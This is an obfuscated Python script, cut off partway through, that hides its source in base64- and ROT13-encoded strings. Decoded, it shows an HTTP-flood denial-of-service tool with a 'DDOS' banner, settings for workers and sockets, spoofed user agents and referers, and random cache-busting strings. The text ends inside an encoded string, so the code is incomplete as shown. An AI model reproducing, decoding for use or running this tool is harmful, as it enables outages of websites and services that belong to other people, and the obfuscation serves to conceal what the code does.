
import base64, codecs
magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KDQoiIiINCiRJZDogJA0KDQogICDiloTiloTiloTiloTiloQgICDilojiloggICDiloTiloggICAg4paEICAgICAg4paE4paE4paE4paE4paAICAgICDilogg4paE4paEICDilojiloggICAgIOKWhCAgIOKWiCAgICAgICAgIOKWiOKWiOKWhCAgIOKWiOKWiOKWhCAgIOKWiOKWiOKWiOKWiOKWhCAgICDiloTiloTiloTiloTiloQgICANCiAg4paIICAgICDiloDiloQg4paIIOKWiCAg4paI4paIICAgICDiloggIOKWgOKWgOKWgCDiloggICAgICAgIOKWiCAgIOKWiCDilogg4paIICAgICDiloggIOKWiCAgICAgICAgIOKWiCAg4paIICDiloggIOKWiCAg4paIICAg4paIICAg4paIICAgICDiloDiloQgDQriloQgIOKWgOKWgOKWgOKWgOKWhCAgIOKWiOKWhOKWhOKWiCDilojilogg4paI4paIICAg4paIICAgICDiloggICAgICAgIOKWiOKWgOKWgOKWgCAg4paI4paE4paE4paIIOKWiCAgIOKWiCDiloggICAgICAgICDiloggICDilogg4paIICAg4paIIOKWiCAgIOKWiCDiloQgIOKWgOKWgOKWgOKWgOKWhCAgIA0KIOKWgOKWhOKWhOKWhOKWhOKWgCAgICDiloggIOKWiCDilpDilogg4paIIOKWiCAg4paIICAgIOKWiCAgICAgICAgIOKWiCAgICAg4paIICDilogg4paIICAg4paIIOKWiOKWiOKWiOKWhCAgICAgIOKWiCAg4paIICDiloggIOKWiCAg4paA4paI4paI4paI4paIICDiloDiloTiloTiloTiloTiloAgICAgDQogICAgICAgICAgICAgIOKWiCAg4paQIOKWiCAg4paIIOKWiCAgIOKWgCAgICAgICAgICAg4paIICAgICAgIOKWiCDilojiloQg4paE4paIICAgICDiloAgICAgIOKWiOKWiOKWiOKWgCAg4paI4paI4paI4paAICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgIOKWiCAgICAg4paIICAg4paI4paIICAgICAgICAgICAgICAgIOKWgCAgICAg4paIICAg4paA4paA4paAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIOKWgCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWgCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KQGF1dGhvciBTYWludCBQYXVsDQoNCkBkYXRlIDIwMjItMjItMjINCkB2ZXJzaW9uIDY2Ng0KDQpAVE9ETyBUZXN0IGluIHB5dGhvbiAzLngNCg0KTElDRU5TRToNCiIiIg0KDQpmcm9tIG11bHRpcHJvY2Vzc2luZyBpbXBvcnQgUHJvY2VzcywgTWFuYWdlciwgUG9vbA0KaW1wb3J0IHVybGxpYi5wYXJzZSwgc3NsDQppbXBvcnQgc3lzLCBnZXRvcHQsIHJhbmRvbSwgdGltZSwgb3MNCmltcG9ydCBodHRwLmNsaWVudA0KSFRUUENMSUVOVCA9IGh0dHAuY2xpZW50DQoNCiMjIyMNCiMgQ29uZmlnDQojIyMjDQpERUJVRyA9IEZhbHNlDQpTU0xWRVJJRlkgPSBUcnVlDQoNCiMjIyMNCiMgQ29uc3RhbnRzDQojIyMjDQpNRVRIT0RfR0VUID0gJ2dldCcNCk1FVEhPRF9QT1NUID0gJ3Bvc3QnDQpNRVRIT0RfUkFORCA9ICdyYW5kb20nDQoNCkpPSU5fVElNRU9VVCA9IDEuMA0KDQpERUZBVUxUX1dPUktFUlMgPSAxMA0KREVGQVVMVF9TT0NLRVRTID0gNTAwDQoNCkJBTk5FUiA9ICcnJyBcMDMzWzE7MzVtDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOjo6IX4hISEhITouICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC54VUhXSCEhICEhP004OFdIWDouICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLlgqI01AJCEhICAhWCFNJCQkJCQkV1d4Oi4gIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiEhISEhIT9IISA6ISQhJCQkJCQkJCQkJDhYOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiEhfiAgfjp+ISEgOn4hJCEjJCQkJCQkJCQkJDhYOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICE6OiF+OjohSCE8ICAgfi5VJFghP1IkJCQkJCQkJE1NIQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDohfiF+ISEhIX5+IC46WFckJCRVISE/JCQkJCQkUk1NIQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiEhOn5+fiAuOiFNIlQjJCQkJFdYPz8jTVJSTU1NIQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB+P1d1eGlXKmAgICBgIiMkJCQkOCEhISE/PyEhIQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOlgtIE0kJCQkICAgICAgIGAiVCMkVH4hOCRXVVhVfg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6JWAgIH4jJCQkbTogICAgICAgIH4hfiA/JCQkJCQkIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6IWAuLSAgIH5UJCQkJDh4eC4gIC54V1ctIH4iIiMjKiIgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAuLi4uLiAgIC1+fjo8YCAhICAgIH4/VCMkJEBAV0AqPyQkICAgICAgL2AgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgVyRAQE0hISEgLiF+fiAhISAgICAgLjpYVVckVyF+IGAifjogICAgOiAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICMifn5gLjp4JWAhISAgIUg6ICAgIVdNJCQkJFRpLjogLiFXVW4rIWAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICA6Ojp+OiEhYDpYfiAuOiA/SC4hdSAiJCQkQiQkJCFXOlUhVCQkTX4gICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgLn5+ICAgOlhAIS4tfiAgID9AV1RXbygiKiQkJFckVEgkISBgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgIFdpLn4hWCQ/IS1+ICAgIDogPyQkJEIkV3UoIioqJFJNISAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAkUkBpLn5+ICEgICAgIDogICB+JCQkJCRCJCRlbjpgYCAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgP01YVEBXeC5+ICAgIDogICAgIH4iIyMqJCQkJE1+ICAgICAgICAgICAgICAgDQoNCg0KXDAzM1sxO20gJycnDQoNCkRET1NfTE9HTyA9ICcnJyBcMDMzWzE7MzVtDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICDiloTiloDiloDilojiloTiloQgICDiloTiloDiloDilojiloTiloQgICDiloTiloDiloDiloDiloDiloQgICDiloTiloDiloDiloDiloDiloQgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAg4paIIOKWhOKWgCAgIOKWiCDilogg4paE4paAICAg4paIIOKWiCAgICAgIOKWiCDilogg4paIICAg4paQIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWkCDiloggICAg4paIIOKWkCDiloggICAg4paIIOKWiCAgICAgIOKWiCAgICDiloDiloQgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWiCAgICDiloggICDiloggICAg4paIIOKWgOKWhCAgICDiloTiloAg4paA4paEICAg4paIICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paE4paA4paE4paE4paE4paE4paAICDiloTiloDiloTiloTiloTiloTiloAgICDiloDiloDiloDiloAgICAg4paI4paA4paA4paAICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAg4paIICAgICDilpAgIOKWiCAgICAg4paQICAgICAgICAgICAg4paQICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAg4paQICAgICAgICDilpAgICAgICAgICAgICAgICAgICAgICAgDQoNClwwMzNbMTttICcnJw0KDQpTID0gJyBcMDMzWzE7MzFtIFMgXDAzM1sxO20gJw0KQSA9ICcgXDAzM1sxOzMybSBBIFwwMzNbMTttICcNCkkgPSAnIFwwMzNbMTszM20gSSBcMDMzWzE7bSAnDQpOID0gJyBcMDMzWzE7MzRtIE4gXDAzM1sxO20gJw0KVCA9ICcgXDAzM1sxOzM1bSBUIFwwMzNbMTttICcNClAgPSAnIFwwMzNbMTszNm0gUCBcMDMzWzE7bSAnDQpVID0gJyBcMDMzWzE7MzZtIFUgXDAzM1sxO20gJw0KTCA9ICcgXDAzM1sxOzM0bSBMIFwwMzNbMTttICcNCg0KDQpTQUlOVF9QQVVMX0xPR08gPSAnJycgXDAzM1sxOzM1bQ0KDQogICAgICDiloTiloDiloDiloDiloDiloQgIOKWhOKWgOKWgOKWiOKWhCAgIOKWhOKWgOKWgOKWiOKWgOKWhCAgICDiloTiloDiloDiloQg4paA4paEICDiloTiloDiloDiloDilojiloDiloDiloQgICAgICDiloTiloDiloDiloTiloDiloDiloDiloQgIOKWhOKWgOKWgOKWiOKWhCAgIOKWhOKWgOKWgOKWhCDiloTiloDiloDiloQgIOKWhOKWgOKWgOKWgOKWgOKWhCAgICAgDQogICAgIOKWiCDiloggICDilpAg4paQIOKWhOKWgCDiloDiloQg4paIICAg4paIICDiloggIOKWiCAg4paIIOKWiCDilogg4paIICAgIOKWiCAg4paQICAgICDiloggICDiloggICDilogg4paQIOKWhOKWgCDiloDiloQg4paIICAg4paIICAgIOKWiCDiloggICAg4paIICAgICAgDQogICAgICAgIOKWgOKWhCAgICAg4paI4paE4paE4paE4paIIOKWkCAgIOKWiCAg4paQICDilpAgIOKWiCAg4paA4paIIOKWkCAgIOKWiCAgICAgICAgIOKWkCAg4paI4paA4paA4paA4paAICAgIOKWiOKWhOKWhOKWhOKWiCDilpAgIOKWiCAgICDiloggIOKWkCAgICDiloggICAgICANCiAgICAg4paA4paEICAg4paIICAg4paE4paAICAg4paIICAgICDiloggICAgICAg4paIICAg4paIICAgICDiloggICAgICAgICAgICAg4paIICAgICAgIOKWhOKWgCAgIOKWiCAgIOKWiCAgICDiloggICAgICAg4paIICAgICAgIA0KICAgICAg4paI4paA4paA4paAICAg4paIICAg4paE4paAICAg4paE4paA4paA4paA4paA4paA4paEICDiloTiloAgICDiloggICAg4paE4paAICAgICAgICAgICAg4paE4paAICAgICAgIOKWiCAgIOKWhOKWgCAgICAg4paA4paE4paE4paE4paE4paAICAgIOKWhOKWgOKWhOKWhOKWhOKWhOKWhOKWhOKWgCANCiAgICAgIOKWkCAgICAgIOKWkCAgIOKWkCAgIOKWiCAgICAgICDilogg4paIICAgIOKWkCAgIOKWiCAgICAgICAgICAgICDiloggICAgICAgICDilpAgICDilpAgICAgICAgICAgICAgICAg4paIICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICDilpAgICAgICAg4paQIOKWkCAgICAgICAg4paQICAgICAgICAgICAgIOKWkCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWkCAgDQoNClwwMzNbMTttICcnJw0KDQpIRUxQX0xPR08gPSAnJycgXDAzM1sxOzM1bQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paEICDilogg4paE4paI4paI4paI4paEICAg4paIICAgICDilogg4paE4paEICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWiCAgIOKWiCDilojiloAgICDiloAgIOKWiCAgICAg4paIICAg4paIIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paI4paI4paA4paA4paIIOKWiOKWiOKWhOKWhCAgICDiloggICAgIOKWiOKWgOKWgOKWgCAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICDiloggICDilogg4paI4paEICAg4paE4paAIOKWiOKWiOKWiOKWhCAg4paIICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWiCAg4paA4paI4paI4paI4paAICAgICAgIOKWgCAg4paIICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDiloAgICAgICAgICAgICAgICAgICAg4paAICANCg0KXDAzM1sxO20gJycnDQoNCg0KVVNFUl9BR0VOVF9QQVJUUyA9IHsNCiAgICAnb3MnOiB7DQogICAgICAgICdsaW51eCc6IHsNCiAgICAgICAgICAgICduYW1lJzogWydMaW51eCB4ODZfNjQnLCAnTGludXggaTM4NiddLA0KICAgICAgICAgICAgJ2V4dCc6IFsnWDExJ10NCiAgICAgICAgfSwNCiAgICAgICAgJ3dpbmRvd3MnOiB7DQogICAgICAgICAgICAnbmFtZSc6IFsnV2luZG93cyBOVCA2LjEnLCAnV2luZG93cyBOVCA2LjMnLCAnV2luZG93cyBOVCA1LjEnLCAnV2luZG93cyBOVC42LjInXSwNCiAgICAgICAgICAg'
love = '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PvNtVPNtVPNtp3IjMKVbH3ElnJgypvjtp2IfMvxhK19cozy0K18bXD0XQDbtVPNtVPNtVUAyoTLhL291oaEypvN9VTAiqJ50MKVAPvNtVPNtVPNtp2IfMv5hpy9mo2AeplN9VT5lK3AiL2gyqUZAPt0XVPNtVPNtVPOjLKWmMJEIpzjtCFO1pzkfnJVhpTSlp2HhqKWfpTSlp2HbqKWfXD0XQDbtVPNtVPNtVTyzVUOupaAyMSIloP5mL2uyoJHtCG0tW2u0qUOmWmbAPvNtVPNtVPNtVPNtVUAyoTLhp3AfVQ0tIUW1MD0XQDbtVPNtVPNtVUAyoTLhnT9mqPN9VUOupaAyMSIloP5hMKEfo2Zhp3OfnKDbWmbaXIfjKD0XVPNtVPNtVPOmMJkzYaIloPN9VUOupaAyMSIloP5jLKEbQDbAPvNtVPNtVPNtp2IfMv5jo3W0VQ0tpTSlp2IxIKWfYaOipaDAPt0XVPNtVPNtVPOcMvOho3Dtp2IfMv5jo3W0Bt0XVPNtVPNtVPNtVPNtp2IfMv5jo3W0VQ0tBQNtnJLtoz90VUAyoTLhp3AfVTIfp2HtAQDmQDbAPt0XVPNtVPNt'
god = 'ICBzZWxmLnJlZmVyZXJzID0gWw0KICAgICAgICAgICAgJ2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS8nLA0KICAgICAgICAgICAgJ2h0dHA6Ly93d3cuYmluZy5jb20vJywNCiAgICAgICAgICAgICdodHRwOi8vd3d3LmJhaWR1LmNvbS8nLA0KICAgICAgICAgICAgJ2h0dHA6Ly93d3cueWFuZGV4LmNvbS8nLA0KICAgICAgICAgICAgJ2h0dHA6Ly8nICsgc2VsZi5ob3N0ICsgJy8nDQogICAgICAgICAgICBdDQoNCg0KICAgIGRlZiBfX2RlbF9fKHNlbGYpOg0KICAgICAgICBzZWxmLnN0b3AoKQ0KDQoNCiAgICAjYnVpbGRzIHJhbmRvbSBhc2NpaSBzdHJpbmcNCiAgICBkZWYgYnVpbGRibG9jayhzZWxmLCBzaXplKToNCiAgICAgICAgb3V0X3N0ciA9ICcnDQoNCiAgICAgICAgX0xPV0VSQ0FTRSA9IGxpc3QocmFuZ2UoOTcsIDEyMikpDQogICAgICAgIF9VUFBFUkNBU0UgPSBsaXN0KHJhbmdlKDY1LCA5MCkpDQogICAgICAgIF9OVU1FUklDICAgPSBsaXN0KHJhbmdlKDQ4LCA1NykpDQoNCiAgICAgICAgdmFsaWRDaGFycyA9IF9MT1dFUkNBU0UgKyBfVVBQRVJDQVNFICsgX05VTUVSSUMNCg0KICAgICAgICBmb3IgaSBpbiByYW5nZSgwLCBzaXplKToNCiAgICAgICAgICAgIGEgPSByYW5kb20uY2hvaWNlKHZhbGlkQ2hhcnMpDQogICAgICAgICAgICBvdXRfc3RyICs9IGNocihhKQ0KD